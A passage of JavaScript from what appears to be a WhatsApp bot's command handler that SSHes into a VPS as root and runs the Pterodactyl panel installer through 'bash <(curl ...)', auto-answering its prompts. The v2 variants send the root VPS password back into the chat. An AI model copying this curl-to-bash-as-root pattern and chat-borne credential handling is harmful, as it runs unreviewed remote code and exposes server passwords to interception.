 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break

case 'installpanel2': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel2 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafaharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case 'installpanel2-v2': {
 if (!isOwner && !isResinstall) return onlyOwn()
 let t = text.split(',');
 if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel2 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = generateRandomPassword();
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 conn.on('ready', () => {
 rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
 conn.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 var teks = `*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Domain\",\"id\":\"123456789\",\"copy_code\":\"${subdomain}\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"SALIN START WINGS\",\"id\":\"123456789\",\"copy_code\":\".startwings ${ipvps},${passwd},\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('Y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break

case 'installpanel3': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel3 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('user\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${domainnode}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        console.log('STDOUT: ' + data);
    }

    function handleNodeCreationInput(data, stream, domainnode, ramvps) {
        stream.write(`${global.tokeninstall}\n`);
        stream.write('4\n');
        stream.write('SGP\n');
        stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
        stream.write(`${domainnode}\n`);
        stream.write('NODES\n');
        stream.write(`${ramvps}\n`);
        stream.write(`${ramvps}\n`);
        stream.write('1\n');
        console.log('STDOUT: ' + data);
    }
}

break  

case 'installpanel3-v2': {
 if (!isOwner && !isResinstall) return onlyOwn()
 let t = text.split(',');
 if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel3 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
 let ipvps = t[0];
 let passwd = t[1];
 let subdomain = t[2];
 let domainnode = t[3];
 let ramvps = t[4];
 const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
 };
 let password = generateRandomPassword();
 const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
 const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
 const conn = new Client();

 conn.on('ready', () => {
 rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
 conn.exec(commandPanel, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
 installWings(conn, domainnode, subdomain, password, ramvps);
 }).on('data', (data) => {
 handlePanelInstallationInput(data, stream, subdomain, password);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }).connect(connSettings);

 async function installWings(conn, domainnode, subdomain, password, ramvps) {
 rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
 conn.exec(commandWings, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
 createNode(conn, domainnode, ramvps, subdomain, password);
 }).on('data', (data) => {
 handleWingsInstallationInput(data, stream, domainnode, subdomain);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 async function createNode(conn, domainnode, ramvps, subdomain, password) {
 const command = `${global.bash}`;
 rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

 conn.exec(command, (err, stream) => {
 if (err) throw err;
 stream.on('close', (code, signal) => {
 console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
 conn.end();
 sendPanelData(subdomain, password);
 }).on('data', (data) => {
 handleNodeCreationInput(data, stream, domainnode, ramvps);
 }).stderr.on('data', (data) => {
 console.log('STDERR: ' + data);
 });
 });
 }

 function sendPanelData(subdomain, password) {
 var teks = `*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`
 let msgii = generateWAMessageFromContent(m.chat, { viewOnceMessage: { message: { 
"messageContextInfo": { 
"deviceListMetadata": {}, 
"deviceListMetadataVersion": 2
}, 
interactiveMessage: proto.Message.InteractiveMessage.create({
contextInfo: { 
mentionedJid: [m.sender], 
externalAdReply: {
showAdAttribution: true }
}, body: proto.Message.InteractiveMessage.Body.create({ 
text: teks
}), 
footer: proto.Message.InteractiveMessage.Footer.create({ 
text: global.foother2
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({ 
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy User\",\"id\":\"123456789\",\"copy_code\":\"admin\"}`
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Copy Password\",\"id\":\"123456789\",\"copy_code\":\"${password}\"}`
},
{
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"Link Panel\",\"url\":\"https://${subdomain}\",\"merchant_url\":\"https://${subdomain}\"}"
},
{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"SALIN START WINGS\",\"id\":\"123456789\",\"copy_code\":\".startwings ${ipvps},${passwd},\"}`
}]
})
})} 
}}, {userJid: m.sender, quoted: m}) 
rafatharcode.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
});
 }

 function handlePanelInstallationInput(data, stream, subdomain, password) {
 if (data.toString().includes('Input')) {
 stream.write('0\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('Asia/Jakarta\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('adm\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${password}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('yes\n');
 }
 if (data.toString().includes('Please read the Terms of Service')) {
 stream.write('Y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleWingsInstallationInput(data, stream, domainnode, subdomain) {
 if (data.toString().includes('Input')) {
 stream.write('1\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${subdomain}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('user\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('1248\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write(`${domainnode}\n`);
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('admin@gmail.com\n');
 }
 if (data.toString().includes('Input')) {
 stream.write('y\n');
 }
 console.log('STDOUT: ' + data);
 }

 function handleNodeCreationInput(data, stream, domainnode, ramvps) {
 stream.write(`${global.tokeninstall}\n`);
 stream.write('4\n');
 stream.write('SGP\n');
 stream.write('Jangan Lupa Support RafatharCode🦅🇮🇩\n');
 stream.write(`${domainnode}\n`);
 stream.write('NODES\n');
 stream.write(`${ramvps}\n`);
 stream.write(`${ramvps}\n`);
 stream.write('1\n');
 console.log('STDOUT: ' + data);
 }
}

break

case 'installpanel4': {
    if (!isOwner && !isResinstall) return onlyOwn()
    let t = text.split(',');
    if (t.length < 5) return rafatharcodereply(`*Format salah!*\nPenggunaan: ${prefix}installpanel4 ipvps,password,domainpnl,domainnode,ramvps (Contoh 80000 8gb)`);
    let ipvps = t[0];
    let passwd = t[1];
    let subdomain = t[2];
    let domainnode = t[3];
    let ramvps = t[4];
    const connSettings = {
        host: ipvps,
        port: '22',
        username: 'root',
        password: passwd
    };
    let password = generateRandomPassword();
    const commandPanel = 'bash <(curl -s https://pterodactyl-installer.se)';
    const commandWings = 'bash <(curl -s https://pterodactyl-installer.se)';
    const conn = new Client();

    conn.on('ready', () => {
        rafatharcodereply('`PROSES PENGINSTALLAN PANEL TUNGGU YA GA SABARAN TAK KOKOP`');
        conn.exec(commandPanel, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Panel installation stream closed with code ' + code + ' and signal ' + signal);
                installWings(conn, domainnode, subdomain, password, ramvps);
            }).on('data', (data) => {
                handlePanelInstallationInput(data, stream, subdomain, password);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }).connect(connSettings);

    async function installWings(conn, domainnode, subdomain, password, ramvps) {
        rafatharcodereply('`PROSES PENGINSTALLAN WINGS TUNGGU YA MANIEZ`');
        conn.exec(commandWings, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Wings installation stream closed with code ' + code + ' and signal ' + signal);
                createNode(conn, domainnode, ramvps, subdomain, password);
            }).on('data', (data) => {
                handleWingsInstallationInput(data, stream, domainnode, subdomain);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    async function createNode(conn, domainnode, ramvps, subdomain, password) {
        const command = `${global.bash}`;
        rafatharcodereply('`MEMULAI CREATE NODE & LOCATION`');

        conn.exec(command, (err, stream) => {
            if (err) throw err;
            stream.on('close', (code, signal) => {
                console.log('Node creation stream closed with code ' + code + ' and signal ' + signal);
                conn.end();
                sendPanelData(subdomain, password);
            }).on('data', (data) => {
                handleNodeCreationInput(data, stream, domainnode, ramvps);
            }).stderr.on('data', (data) => {
                console.log('STDERR: ' + data);
            });
        });
    }

    function sendPanelData(subdomain, password) {
        rafatharcodereply(`*DATA PANEL ANDA*\n\n*USERNAME:* admin\n*PASSWORD:* ${password}\n*LOGIN:* ${subdomain}\n\nNote: Semua Instalasi Telah Selesai Silahkan Create Allocation Di Node Yang Di buat Oleh Bot Dan Ambil Token Configuration dan ketik .startwings (token) \nNote: *HARAP TUNGGU 1-5MENIT BIAR WEB BISA DI BUKA*`);
    }

    function handlePanelInstallationInput(data, stream, subdomain, password) {
        if (data.toString().includes('Input')) {
            stream.write('0\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1248\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('Asia/Jakarta\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin@gmail.com\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('admin\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('adm\n');
        }
        if (data.toString().includes('Input')) {
            stream.write(`${password}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write(`${subdomain}\n`);
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('yes\n');
        }
        if (data.toString().includes('Please read the Terms of Service')) {
            stream.write('Y\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('\n');
        }
        if (data.toString().includes('Input')) {
            stream.write('1\n');
        }
        console.log('STDOUT: ' + data);
    }

